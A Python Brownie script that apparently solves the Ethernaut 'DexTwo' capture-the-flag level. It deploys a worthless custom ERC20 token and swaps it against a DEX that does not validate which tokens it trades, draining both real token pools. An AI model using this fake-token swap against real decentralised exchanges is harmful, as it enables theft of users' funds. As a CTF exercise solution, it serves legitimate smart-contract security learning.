from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import DexTwo, DexTwoAttack

##########################################
# You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        dextwo = load_challenge(ContractObject=DexTwo, instance_key='dex2')
    else:
        dextwo = deploy_locally(ContractObject=DexTwo, from_account=_from)

    # get token 1 and token 2 addresses
    tk1 = dextwo.token1()
    tk2 = dextwo.token2()
    
    # deploy dextwo attack ERC20 token
    dextwoattack = DexTwoAttack.deploy('token3', 'TK3', '10000000000000', _from)

    # approve that dextwo transfers our token3s
    dextwoattack.approve(dextwo.address, 2**256 - 1, _from)

    # add liquidity to the pool by sending the tokens
    dextwoattack.transfer(dextwo.address, 10, _from)

    # drain the pools
    dextwo.swap(dextwoattack.address, tk1, 10, _from)
    dextwo.swap(dextwoattack.address, tk2, 20, _from)

    # check the balances
    balanceTK1 = dextwo.balanceOf(tk1, dextwo.address)
    balanceTK2 = dextwo.balanceOf(tk2, dextwo.address)
    print(f"The pool balances are: TK1: {balanceTK1}, TK2: {balanceTK2}")
    
    # the pools have been drained
    balance_assertion = balanceTK1 == 0 and balanceTK2 == 0
    print(f"The pools have been drained: {balance_assertion}")

    return balance_assertion

def main():
    solve_challenge()
